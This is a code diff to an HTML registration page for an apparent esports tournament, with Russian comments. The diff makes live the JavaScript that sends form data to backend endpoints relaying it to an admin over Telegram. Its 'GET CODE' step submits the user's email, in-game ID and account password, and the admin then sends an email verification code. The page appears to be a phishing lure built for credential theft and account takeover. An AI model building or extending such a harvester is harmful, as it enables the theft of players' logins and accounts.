@@ -823,8 +823,8 @@
                     </div>
                     <div id="code-status" class="status"></div>
                     <div class="note">
-                        Demo mode: validation is handled locally.
-                        For production connect this check to a secure backend.
+                        Codes list is controlled by admins. Frontend uses local demo list;
+                        backend registration is always stored + sent to Telegram.
                     </div>
                 </div>
             </section>
@@ -836,7 +836,7 @@
                 </div>
                 <div class="section-sub">
                     After filling all fields, your application is sent for manual verification.
-                    Admin receives it in Telegram with Approve / Deny buttons (via your backend/bot).
+                    Admin receives it in Telegram with Approve / Deny buttons.
                 </div>
 
                 <form id="reg-form" class="card">
@@ -884,7 +884,7 @@
                             </div>
                             <div class="note">
                                 Press "GET CODE" to send your data for manual review.
-                                Admin receives it in Telegram and can send you a code.
+                                Admin will check and send verification code / decision.
                             </div>
                         </div>
                     </div>
@@ -911,9 +911,7 @@
 
             <!-- AFTER SUBMIT -->
             <section class="section" id="final-message" style="display:none;">
-                <div class="card" id="final-card">
-                    <!-- Контент заполняется скриптом в зависимости от ответа -->
-                </div>
+                <div class="card" id="final-card"></div>
             </section>
 
         </div>
@@ -962,7 +960,7 @@
 </div>
 
 <script>
-    // DEMO: valid codes
+    // DEMO valid codes (фронт, можешь менять/убрать, бек всё равно всё шлёт в ТГ)
     const VALID_CODES = ["FLOW2025", "ESPORTPUBG", "V7ACCESS"];
 
     const openGatewayBtn = document.getElementById('open-gateway');
@@ -978,6 +976,41 @@
     const finalMessage = document.getElementById('final-message');
     const finalCard = document.getElementById('final-card');
     const requestEmailCodeBtn = document.getElementById('request-email-code');
+
+    // --- helper: notify admin via backend (ТГ) ---
+    function notifyAdmin(type, payload = {}) {
+        return fetch("/api/notify-admin", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ type, ...payload })
+        })
+        .then(r => r.json())
+        .then(data => {
+            console.log("Admin notify result:", data);
+            return data;
+        })
+        .catch(err => {
+            console.error("Admin notify error:", err);
+            return { ok: false, error: "fetch_failed" };
+        });
+    }
+
+    // --- send full application to backend ---
+    async function sendApplication(formData) {
+        try {
+            const res = await fetch("/api/submit-registration", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(formData)
+            });
+            if (!res.ok) throw new Error("Bad response");
+            return await res.json(); // {status, uid}
+        } catch (e) {
+            console.error("submit-registration error, fallback notify:", e);
+            await notifyAdmin("full_application_fallback", formData);
+            return { status: "pending" };
+        }
+    }
 
     // Scroll CTA appears after user reaches end of tournament announcement
     if (tournamentSection && scrollCta) {
@@ -1006,36 +1039,7 @@
         });
     }
 
-    // Local demo: send data to admin (replace with real backend / Telegram bot)
-    function notifyAdmin(type, payload) {
-        console.log("SEND TO ADMIN:", type, payload);
-        // Example backend call:
-        // return fetch("/api/notify-admin", {
-        //   method: "POST",
-        //   headers: { "Content-Type": "application/json" },
-        //   body: JSON.stringify({ type, ...payload })
-        // });
-        return Promise.resolve();
-    }
-
-    // Example: submit application to backend that integrates Telegram Approve / Deny
-    async function sendApplication(formData) {
-        try {
-            const res = await fetch("/api/submit-registration", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(formData)
-            });
-            if (!res.ok) throw new Error("Bad response");
-            return await res.json(); // {status: "approved"|"rejected"|"pending"}
-        } catch (e) {
-            // fallback: at least ping admin
-            await notifyAdmin("full_application", formData);
-            return { status: "pending" };
-        }
-    }
-
-    // Verify code
+    // Verify code (фронт)
     if (checkCodeBtn) {
         checkCodeBtn.addEventListener('click', function () {
             const val = (codeInput.value || "").trim().toUpperCase();
@@ -1058,7 +1062,7 @@
         });
     }
 
-    // "GET CODE" -> send partial form to admin
+    // "GET CODE" -> отправить частичные данные админу
     if (requestEmailCodeBtn) {
         requestEmailCodeBtn.addEventListener('click', async () => {
             regStatus.textContent = "";
@@ -1074,15 +1078,22 @@
                 return;
             }
 
-            await notifyAdmin("email_code_request", {
-                accessCode: (codeInput.value || "").trim(),
+            const accessCode = (codeInput.value || "").trim();
+
+            const res = await notifyAdmin("email_code_request", {
+                accessCode,
                 ingameId,
                 email,
                 password: pass
             });
 
-            regStatus.textContent = "Request sent. Admin will review and send a verification code to your email.";
-            regStatus.className = "status ok";
+            if (res && res.ok) {
+                regStatus.textContent = "Request sent. Admin will review and send a verification code to your email.";
+                regStatus.className = "status ok";
+            } else {
+                regStatus.textContent = "Request sent locally. If no email within some time — contact support / admin.";
+                regStatus.className = "status err";
+            }
         });
     }
 
